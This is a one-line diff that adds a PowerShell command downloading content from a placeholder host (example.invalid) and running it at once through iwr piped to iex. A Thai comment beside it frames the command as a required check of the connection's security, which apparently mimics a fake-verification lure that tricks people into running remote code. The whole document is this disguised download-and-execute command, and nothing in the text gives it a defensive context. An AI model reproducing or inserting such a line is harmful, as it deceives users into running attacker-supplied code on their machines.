@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # จำเป็นต้องตรวจสอบความปลอดภัยของการเชื่อมต่อของคุณก่อนดำเนินการต่อ
